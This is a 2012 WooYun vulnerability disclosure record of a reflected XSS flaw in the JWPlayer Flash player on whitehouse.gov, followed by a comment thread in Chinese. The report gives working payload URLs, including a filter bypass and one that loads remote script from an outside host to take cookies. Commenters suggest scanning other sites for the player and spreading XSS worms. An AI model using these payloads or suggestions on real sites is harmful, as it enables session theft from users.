{"id": 20274, "wybug_id": "wooyun-2012-07165", "wybug_title": "美国白宫主站XSS，求跨Obama", "wybug_corp": "美国白宫", "wybug_author": "gainover", "wybug_date": "2012-05-15 23:07", "wybug_open_date": "2012-05-15 23:07", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "反射型", "搞笑有爱", "安全", "应用安全", "利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-15：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-05-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 这个这个，没上下文，白宫人不多吧，我跨谁呢，跨谁呢！！  详细说明：  I hope my Chinese-Wind-English can be understood.First, The Website of the WhiteHouse use a JWPlayer (a video player based on flash from longtailvideo, www.longtailvideo.com), and this player have a xss vulnerability. Next, we could use this vulnerability to construct an evil link to attack potential victims. The codes are listed below!The evil code can be run in both IE and Firefox, but crashed in Chrome (:( unkown reason).The attack flow: 1. Simple Alert, However, we got a \"Access Denied Error\". The server seems to have some strange filter rules? Luckily, We can bypass this limitation. Failed Code\nhttp://www.whitehouse.gov/files/flash/player.swf?debug=function(){alert(1)}\nSuccess Code\nhttp://www.whitehouse.gov/files/flash/player.swf?debug=function(){var a=alert;a(1)}\n2. We found some other sensetive words are also banned, such as <script></script>.3. The code used above is runable but harmless. A more harmful code :\nhttp://www.whitehouse.gov/files/flash/player.swf?debug=(function(){var s='scr'.concat('ipt');location.replace('javascript:\"<b src=//appmaker.sinaapp.com/a.js></b>\"'.replace(/b/g,s))})\n4. Run it then known it. (in Chinese: 试试看你就知道了!)   漏洞证明：  1. Simple alert example\n\n2. Cookies got from whitehouse and sent to our own page.\n\n 3. Firefox can also run evil codes.\n\n   修复方案：  Delete unused JWPlayer or wait for JWPlayer update.    版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：3 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2012-05-15 23:08 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  nice english,guy!    \n     2012-05-15 23:15 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @xsser  这么快      \n     2012-05-15 23:21 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  漏洞玩得尽兴啊！    \n     2012-05-15 23:26 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  可以去社个44 ：0    \n     2012-05-15 23:28 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @xsser 这个得请凤姐出马了。。 俺们没绿卡～～    \n     2012-05-15 23:31 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  玩的开心！小心FBI和CIA。哈哈    \n     2012-05-15 23:33 |    \t\titianda \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:4        | 冰冷的天雾湿了谁的眼你不在我身边思...)\t\t \n  继续膜拜G博士..    \n     2012-05-15 23:34 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  SWF的跨域会火。。期待新作啊！！    \n     2012-05-15 23:45 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  大哥你玩的真有爱啊。上个月貌似，泉哥发过白宫的xss吧。    \n     2012-05-15 23:49 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  Chinese-Wind-English。。chinese style吧。。。google翻译的?    \n     2012-05-15 23:50 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  whitehouse使用的是drupal,大家可以扫下drupal用了该插件的网站。然后跨站。drupal有人用做sns,大家可以找几个sns练练xss蠕虫    \n     2012-05-15 23:52 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @蟋蟀哥哥 = = GOOGLE能这么智能的加破折号么..    \n     2012-05-15 23:53 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover -。-  那你的english太棒了，有最炫民族风的感觉.    \n     2012-05-15 23:54 |    \t\ttnt1200 \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:17        | 关注飞机安全....)\t\t \n  @蟋蟀哥哥 是中国风英语吧    \n     2012-05-15 23:54 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @蟋蟀哥哥 俺自己能看懂，俺就满足了     \n     2012-05-15 23:57 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover 呵呵。。这个漏洞挺给力的。不管有多炫了    \n     2012-05-16 00:05 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover 刚刚查看了下，发现joomla也有这玩意    \n     2012-05-16 00:08 |    \t\t梦想肥羊 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:18        | 博客：dnswalk.blog.163.com)\t\t \n  惊动党中央。    \n     2012-05-16 00:10 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @蟋蟀哥哥  额。用这个程序的网站还是挺多的。 不过就是看版本，这个播放器早些时期的版本好像没这个漏洞，大概在4.5,4.6以后才有。     \n     2012-05-16 00:13 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover 嗯。好像和他的debug模式有关系。4.5,4.6是默认开启的？    \n     2012-05-16 00:15 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  他代码里debug的开启不开启，就是与你传入不传入debug这个参数有关，之前的版本，好像没加debug的功能吧，我也没去仔细看源码。 国外视频站貌似挺多用这个东西的，  http://www.videospace.us/ 首页播放器就是了～·    \n     2012-05-16 00:20 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover 查看了下，国外是用得多。但是版本符合的较少。    \n     2012-05-16 00:22 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover 目前发现了这个：http://portaldemo2.securitycoverage.com/index.php/js/player/player.swf    \n     2012-05-16 00:24 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @蟋蟀哥哥  = = 我找了个www.intel.com下的。。  俺都集中发这里了。。  WooYun: JWPlayer Xss 0day [Flash编程安全问题]    \n     2012-05-16 00:28 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover 这个漏洞的研究价值以及爆路径的价值，大于xss的价值。    \n     2012-05-16 00:32 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @蟋蟀哥哥  = = 还能爆路径啊？ 刚又找到一个百度的。     \n     2012-05-16 00:40 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover 是的，可以爆服务器路径.既然可以爆路径，应该有办法一句话了。。    \n     2012-05-16 00:43 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @蟋蟀哥哥 = = 对渗透那套知知甚少。     \n     2012-05-16 00:45 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  you got better English than I do. Zhi neng mobai a Big Ox    \n     2012-05-16 00:45 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover 我对flash不了解啊。。。你看看有没有办法运行php命令的    \n     2012-05-16 00:50 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @蟋蟀哥哥 = = 怎么运行PHP？ 你意思是用XSS自动传SHELL的那种？    \n     2012-05-16 00:54 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover 我是说参数里面加入php代码，让页面运行.    \n     2012-05-16 00:55 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @蟋蟀哥哥 一个是客户端一个服务端的 你丢人了    \n     2012-05-16 00:58 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @gainover 这个。。这个。。 貌似不行吧！    \n     2012-05-16 00:59 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @xsser 我开始说了这个bug可以爆路径的。服务端可以运行。    \n     2012-05-16 01:00 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover 发送邮件到：shuai.zend#qq.com 我给你演示爆路径    \n     2012-05-16 01:08 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @蟋蟀哥哥 已发送     \n     2012-05-16 01:09 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  这么晚还在乌云激情。    \n     2012-05-16 01:22 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @zeracker 必须的，您老不也在。 哈哈    \n     2012-05-16 01:27 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @gainover  我都是每天三无点睡觉，中午起床的哈。    \n     2012-05-16 01:37 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @zeracker = = 牛 。都是黑夜里闪烁着光芒的那一颗    \n     2012-05-16 02:16 |    \t\ttestcvc \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | test)\t\t \n  膜拜楼上各位半夜发光的大牛    \n     2012-05-16 02:16 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @gainover 。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。    \n     2012-05-18 14:20 |    \t\tPPFish \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 一株是枣树，另一株还是枣树。)\t\t \n  =。= Nice Chinese-Wind-English    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 3, "Ranks": null}